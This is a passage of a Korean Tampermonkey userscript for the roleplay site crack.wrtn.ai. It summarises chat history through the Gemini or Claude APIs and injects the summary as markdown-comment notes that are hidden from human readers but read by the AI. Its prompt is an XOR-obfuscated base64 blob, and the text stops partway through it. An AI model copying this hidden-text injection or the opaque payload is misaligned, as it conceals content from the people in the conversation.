// ==UserScript==
// @name         조아메모리ෆ
// @namespace    memo-note.v2
// @version      3.9.21
// @updateURL    https://raw.githubusercontent.com/foru5g-cmyk/joahmemory/refs/heads/main/joamemory.user.js
// @downloadURL  https://raw.githubusercontent.com/foru5g-cmyk/joahmemory/refs/heads/main/joamemory.user.js
// @description  앱으로 RP하다가 웹에서 열면, 지난 정리 이후 대화만 읽어 기억을 이어서 정리하고 숨김 노트로 넣어 줍니다.
// @match        https://crack.wrtn.ai/*
// @noframes
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM.xmlHttpRequest
// @grant        GM.getValue
// @grant        GM.setValue
// @connect      crack-api.wrtn.ai
// @connect      contents-api.wrtn.ai
// @connect      generativelanguage.googleapis.com
// @connect      api.anthropic.com
// @connect      script.google.com
// @connect      script.googleusercontent.com
// @run-at       document-idle
// ==/UserScript==

(function () {
  'use strict';
  if (window.__MEMO_NOTE__) return;
  window.__MEMO_NOTE__ = true;

  // ══════════════════════════════════════════════════════════════
  // 1. 숨김 노트 형식
  //   마크다운 주석 줄은 화면에 그려지지 않고, 원문을 읽는 AI에게만 보입니다.
  //   [//]: # (MEMO_NOTE v2 upto=<마지막 정리 메시지 ID> turns=<누적 턴> at=<시각>)
  //   [//]: # (기억 본문 한 줄)
  //   [//]: # (MEMO_NOTE_END)
  // ══════════════════════════════════════════════════════════════
  const LINE = t => `[//]: # (${t})`;
  const LINE_RE = /^\[\/\/\]: # \((.*)\)\s*$/;
  const V2_RE = /\n*\[\/\/\]: # \(MEMO_NOTE v2[^\n]*\)\n(?:\[\/\/\]: # \([^\n]*\)\n?)*?\[\/\/\]: # \(MEMO_NOTE_END\)/g;
  const V1_RE = /\n*<!--MEMO_NOTE[\s\S]*?MEMO_NOTE_END-->/g; // 0.1 판 형식 (읽기·지우기만)
  // v3: 한 덩어리. 첫 줄에만 [//]: # " 를 붙이고 마지막 줄을 " 로 닫으면 그 사이 여러 줄이 통째로 숨겨집니다.
  //   [//]: # "MEMO_NOTE v3 upto=<ID> turns=<턴> at=<시각>
  //       (기억 본문 — 일반 글 그대로, 줄마다 앞에 공백 4칸)
  //       MEMO_NOTE_END"
  //   공백 4칸이 없으면 "## 제목"이나 "- 항목" 줄에서 덩어리가 끊겨 화면에 보입니다.
  const V3_RE = /\n*\[\/\/\]: # "MEMO_NOTE v3[^\n]*\n[\s\S]*?\n[ \t]*MEMO_NOTE_END"/g;
  // AI가 노트를 따라 쓰다 출력 한도에서 잘린 사본(시작만 있고 끝이 없음)도 그 자리부터 지웁니다.
  const stripBlocks = t => String(t || '').replace(V3_RE, '').replace(V2_RE, '').replace(V1_RE, '').replace(/\n*\[\/\/\]: # "MEMO_NOTE v3[\s\S]*$/, '');

  const DEFAULT_MODEL = 'gemini-3.5-flash';
  // 설정에서 버튼으로 고르는 모델. 단가는 priceOf에 있습니다.
  const MODELS = [
    ['Gemini', [['gemini-4-argon', '4 Argon (최신)'], ['gemini-3.5-flash', '3.5 Flash (기본)'], ['gemini-3.8-flash', '3.8 Flash'], ['gemini-3.7-flash', '3.7 Flash'], ['gemini-3.6-flash', '3.6 Flash'],
      ['gemini-3.5-flash-lite', '3.5 Flash-Lite'], ['gemini-3.1-flash-lite', '3.1 Flash-Lite'], ['gemini-3.1-pro-preview', '3.1 Pro'], ['gemini-2.5-pro', '2.5 Pro']]],
    ['Claude', [['claude-fable-5-1', 'Fable 5.1 (가장 똑똑함)'], ['claude-opus-5-5', 'Opus 5.5'], ['claude-opus-5', 'Opus 5'], ['claude-sonnet-5-5', 'Sonnet 5.5'], ['claude-sonnet-5', 'Sonnet 5'], ['claude-haiku-5-5', 'Haiku 5.5 (가장 쌈)'], ['claude-haiku-4-5', 'Haiku 4.5']]],
  ];
  const MODEL_IDS = MODELS.flatMap(([, list]) => list.map(([id]) => id));
  const isClaude = model => /^claude-/.test(model);
  // 설정에서 켜고 끌 수 있는 칸. 끄면 정리할 때 AI가 그 칸을 만들지 않습니다.
  const OPTIONAL = [['감정선', 'secFeels', '두 사람의 감정이 어떻게 변해 왔는지'], ['소지품', 'secItems', '중요한 물건의 상태와 내력'], ['장소·조직', 'secPlaces', '다시 찾을 장소와 조직']];
  const offSections = async () => { const off = []; for (const [k, key] of OPTIONAL) if (String(await getValue(key, 'on')) === 'off') off.push(k); return off; };
  const CYCLES = [10, 15, 20, 25, 30];
  const READ_PAGE = 50;
  // 노트 목표 크기. 넘칠 것 같으면 오래된 사건부터 줄입니다.
  //   크랙 메시지는 100KB까지. UTF-16LE로 보내면(writeMessage) 한글 약 5만 자라 5만 자가 끝입니다.
  //   이 크기는 근거 줄·감정선까지 센 값이고, 채팅에 들어가는 건 그걸 뺀 나머지라 실제 주입은 더 작아요.
  const LIMITS = [30000, 35000, 40000, 45000, 50000];
  let NOTE_LIMIT = 30000;

  // 기억 칸. key는 노트 안 "## 제목"과 같습니다.
  const FIXED = '고정 설정';
  const SECTIONS = [
    { key: FIXED,         short: '고정',     group: 'memory', color: '#B9AEF0', icon: 'lock'   },
    { key: '줄거리',      short: '줄거리',   group: 'memory', color: '#C9C2EE', icon: 'thread' },
    { key: '이정표',      short: '이정표',   group: 'memory', color: '#E9A9A0', icon: 'pin'    },
    { key: '현재상태',    short: '현재상태', group: 'memory', color: '#9CC4EE', icon: 'pin'    },
    { key: '인물',        short: '인물',     group: 'people', color: '#EFA6C4', icon: 'person' },
    { key: '인지·비밀',   short: '인지',     group: 'people', color: '#A6D9B5', icon: 'eye'    },
    { key: '소지품',      short: '소지품',   group: 'memory', color: '#E8C48A', icon: 'note'   },
    { key: '장소·조직',   short: '장소·조직', group: 'memory', color: '#B7D8C2', icon: 'globe'  },
    { key: '서사 고리',   short: '서사 고리', group: 'memory', color: '#F2B190', icon: 'thread' },
    { key: '명대사',      short: '명대사',   group: 'memory', color: '#D9C8F0', icon: 'quote'  },
    { key: '감정선',      short: '감정선',   group: 'people', color: '#F4BCD3', icon: 'heart'  },
    { key: '세계관',      short: '세계관',   group: 'memory', color: '#C4C4CC', icon: 'globe'  },
    { key: '날짜로그',    short: '날짜로그', group: 'memory', color: '#EBCB7A', icon: 'cal'    },
    { key: '관계·감정선', short: '관계',     group: 'people', color: '#F4BCD3', icon: 'heart'  },
    { key: '호칭·말투',   short: '호칭·말투', group: 'people', color: '#93D3BE', icon: 'speech' },
  ];
  const ALIAS = { '지난 줄거리': '날짜로그', '열린 떡밥': '서사 고리', '관계도': '관계·감정선', '인지': '인지·비밀', '호칭': '호칭·말투' };
  const secInfo = key => SECTIONS.find(s => s.key === key) || { key, short: key, group: 'memory', color: '#7D8299', icon: 'note' };

  const KNOW = ['알고 있음', '모름', '일부만 앎', '의심', '전해 들음', '부정', '오해', '잊음'];

  // ══════════════════════════════════════════════════════════════
  // 2. 정리 지침 (프롬)
  // ══════════════════════════════════════════════════════════════
  // 지침 글은 스크립트를 열어도 바로 읽히지 않게 섞어 두고, 실행할 때만 풀어 씁니다(완전히 숨기는 건 아니에요).
  const unveil = b64 => { const k = new TextEncoder().encode('joamemory-2026'), b = Uint8Array.from(atob(b64), c => c.charCodeAt(0)); for (let i = 0; i < b.length; i++) b[i] ^= k[i % k.length]; return new TextDecoder().decode(b); };
  const PROMPT = unveil('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kqaWHjgFRE+KyvWB8sZZwaW23qrWhMjZRYfYypKhstuTqoHkxUNFhuTWlaauENm08oP5yYnK71KVuLjcp66B5MWH1s1PmdWR2IGG2vfbQYHy64PkzcGVsNiH2oTj9UWB98WVsIYQ2Yb+hOHhj9zfmfu1EtqGtoDc5a/SgfrPlau/8oXd3O+N7uSv2JnAqdmAstr320GG5PCE8OUN2IKx2vfbQYHw6YT58ca5lBwWhvrpTY7e257klRLagLVKjejNRYH49JKnphDYhOlDQYHw5U+f7LES2oC1So3ozUWGxclZwKeo2bz+T4vf5kNlRlcN3ruW2srzisz5TYPvxcGkhNm08oPG7UWB+viVsLIQ2ITpR4vS7a/Ymd6h3qWP2vf3QYH42YPnxceKgPCBhuzggebsrcWVuoLaioao2IrK9YbI/lnAp6wS3NnrjPfor9iYyJ3el6Hdzf+j2onr45nVlRvcr7ZKg+PBiebLUpWUitylpkqD8t2Jyu9Slbi427iigeTFQ0WG3+qSobLbk6pKg/zVjsHTnuStEtqNvobz3YbE8U+e7KHel7LdzeNBgeHxg/rZxpOs2bz+T43K4YHI7lnBr4zeoN6E4/FFgfLOlbCG25uCRk+N78mH3saVsY7bk6pKg/Ldj97PUlvGgYjeq9KD/O1Fh9D6lbGO25OqSoP040eB8vZZxr+X2YDzg/zVjubLXFnAqLzeteuD/dGOzPNSkq+q3KqeSoP80Ynw71KUt77csbeH+v1Nju/PnuSZEtynsoHk6Yb40U+YzpUS3K+KhvLVTYnw057vmdmyrhaB7cGBwvGE0+UN3qOG3eHLT2dQQ0+f7LXZkJbc2c9BgPDxT5jLrtiDjhaH+v1Nj9/snuStEtu5koHK1YbuyUFSk5623ai7qNiN5vmG4Pa7mt6sktvy1qPaifHrn+G82Ze+2vbTisz5TYP53cCkud+g4oTqyY/ez1KVvoLclbZKg/Tnjuf7mfKJGhLZueaEwcmJztOYy43Zu5YUgNzBTYj7557lkdmZhhaG+uWBwuxPnuylEtu9uoHPxYHB7U+Yy64bHhLa6e6M7vmG5eZZwamg2ZrShO3tjszzUpW1utySo0pAQYDw9YT47Q3elKMWRU+K7PiG7dpZAhLcuZKH48mv0oHY2pWrvhDekvtPjPj9hu3qkoyuHjgARE+NztmB+caSiI4Q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u5rZuLbc38ON+vWH3f67mt6prvTdg/fVic3zsM7Bk4DYh96t1oH+/YTewQ3Yh47c29+K5/FNhcXBxr6w2Zf2Rk9NicrInuyp3pey3eD7QYfX4U+e7KnZu7rd99NBgc/RhcLlwZWw2bz+T4vf5oHyxpKmlh44G0qDwN2J78OZ87kS3aeqSoPjwY7z41KVsIbcp4qA19GGwuFPnuel2bqmFobL5YHy/YP25caVvBLa6fKK89CA+tJZwbqoEtr054rmwUNPmei9EtywmoHx7U2J8Nue+qzerYYWge35gf3JhcPJxrCoEt3i64vd5U2E+v3Hh5zeofqF0+FFgPruWcGvjN6r3oTI2UWBzsKVr54Y3qveQIvd5a/YnuSpHduXiqjYjfr1h93+u5rep6Lc2OON6fmv2J7grRvbl4pKhd3ARYH8xpKmlh44G0qE2NGOxNtSkrGJ3K+CSoTqwY7w057erdm6phaByPGB+O1PmfuF2IiG3eHLW02O5euYya0S27qygNrNgfL9hcD1ARLcp76o2IrH3q/YmMGl3peyGkqD0/Sn2oP55ca9tPCBh/r5hsXJhPndARLclaaG8fCv0oHP9pS4hhDZpc6D/O1Fhsjik56OENm+7oXUwUWGyOKVsIrclbZCSIrN7YH32pWwqhDZkfqEwPGO5/tVUAES3ICuhvLtr9KGx86VjbLyhd3hy43m+a/Ynuyp3pez9N2D/NmJzfOZ87keEEzdzeOj2huH1v6VirIcEtrK64369Ybl5lnBpITZo8qF0s1Fgcjyk5W63K+2SoP32Y77y57erR4Q3rDng/3Rjszzmd6hEtyxq4Df4IDw8U+Yy67erYraze9BhsL9hNPlDd+lrhaA3eKB+NWD1fkBEtyrqkqF1tWO8t9Sk52i3JKjhvLZgcLtQVJex4WI2ITprdaH0tVPnuSR8IfYgdJPjfjYgen/Xg3ZvLLa4c9BhsnZg+X+wa+I3pHqT43+0Ybk1lcN2IeK9N2F1tWO6O+Yya0S27qygNrRgcLtT5/umtiAut3Mw4rE0U2D783GlLTeq+5Pjf7RhuTWVycfENmM7k+KyvVXT5/smd60r9v/94rn8U2E3sHBrJUaERSD/PVFh9z2k5WC2oK2SoTxxUJBT1UHxpeMEt3584ryyYbs9l4EHhDelv+Exv2n2oT28caehPCBgcjFgf/